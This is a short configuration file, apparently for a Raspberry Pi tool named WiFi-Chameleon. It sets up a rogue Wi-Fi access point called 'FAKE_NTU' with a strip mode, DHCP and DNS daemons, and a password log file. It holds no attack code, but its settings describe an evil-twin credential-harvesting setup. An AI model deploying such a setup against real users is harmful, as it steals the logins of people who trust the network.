AP_INTERFACE="wlan0"
CONN_INTERFACE="wlan1"
AP_NAME="FAKE_NTU"
SUBDOMAIN="wireless"
STRIP_MODE=True
PROJ_ROOT="/home/pi/WiFi-Chameleon/"
DHCP_CLIENT_LEASE_PATH="/var/lib/dhcpcd5/"
DHCP_SERVER_CONF_PATH="/etc/dhcp/dhcpd.conf"
SETTINGS_PATH=PROJ_ROOT+"data/settings.json"
CONF_PATH=PROJ_ROOT+"conf/"
PASSWORD_LOG="data/password.log"
RELAY_CACHE="data/relay_cache"
DAEMONS=["isc-dhcp-server", "hostapd", "dnsmasq", "nginx"]
